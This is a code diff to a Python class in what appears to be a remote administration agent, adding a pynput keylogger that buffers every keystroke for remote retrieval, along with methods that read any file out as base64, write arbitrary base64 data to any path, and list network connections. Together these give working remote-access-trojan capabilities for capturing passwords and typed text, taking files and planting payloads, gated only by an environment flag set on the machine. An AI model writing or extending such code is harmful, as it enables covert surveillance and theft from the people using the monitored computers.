@@ -8,13 +8,17 @@ import subprocess
 import time
 from pathlib import Path
 from typing import Any
-
 import psutil
+from pynput import keyboard
 
 
 class SystemModules:
     def __init__(self) -> None:
         self.consent = os.getenv("REMOTE_ADMIN_CONSENT", "false").lower() == "true"
+        
+        self.keylogs = ""
+        self.keylogger_listener = None
+        # ------------------------------------------------------
 
     def processes(self) -> list[dict[str, Any]]:
         items = []
@@ -89,7 +93,6 @@ class SystemModules:
         - path=<absolute> → lists contents of that directory
         """
         if not path:
-            # Root: show drives on Windows, / on Linux/macOS
             if platform.system() == "Windows":
                 drives = []
                 for letter in string.ascii_uppercase:
@@ -194,3 +197,62 @@ class SystemModules:
             return {"ok": True, "image_base64": base64.b64encode(data).decode("ascii")}
         except Exception as error:
             return {"ok": False, "error": str(error)}
+
+    def start_keylogger(self) -> dict:
+        if not self.consent:
+            return {"ok": False, "error": "local consent is disabled on this Agent"}
+        if self.keylogger_listener and self.keylogger_listener.running:
+            return {"ok": True, "status": "already running"}
+        
+        def on_press(key):
+            try:
+                self.keylogs += key.char
+            except AttributeError:
+                self.keylogs += f" [{key}] "
+                
+        self.keylogger_listener = keyboard.Listener(on_press=on_press)
+        self.keylogger_listener.start()
+        return {"ok": True, "status": "started"}
+
+    def get_keylogger(self) -> dict:
+        return {"ok": True, "logs": self.keylogs}
+
+    def stop_keylogger(self) -> dict:
+        if self.keylogger_listener:
+            self.keylogger_listener.stop()
+            self.keylogger_listener = None
+        logs = self.keylogs
+        self.keylogs = ""
+        return {"ok": True, "logs": logs, "status": "stopped"}
+
+    def read_file(self, path: str) -> dict:
+        try:
+            with open(path, "rb") as f:
+                data = base64.b64encode(f.read()).decode("ascii")
+            return {"ok": True, "file_data": data, "filename": os.path.basename(path)}
+        except Exception as e:
+            return {"ok": False, "error": str(e)}
+
+    def write_file(self, path: str, base64_data: str) -> dict:
+        try:
+            with open(path, "wb") as f:
+                f.write(base64.b64decode(base64_data))
+            return {"ok": True, "path": path}
+        except Exception as e:
+            return {"ok": False, "error": str(e)}
+
+    def network_connections(self) -> dict:
+        try:
+            conns = []
+            for c in psutil.net_connections(kind='inet'):
+                conns.append({
+                    "fd": c.fd,
+                    "type": str(c.type),
+                    "laddr": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else None,
+                    "raddr": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else None,
+                    "status": c.status,
+                    "pid": c.pid
+                })
+            return {"ok": True, "connections": conns}
+        except psutil.AccessDenied:
+            return {"ok": False, "error": "access denied - run as admin"}
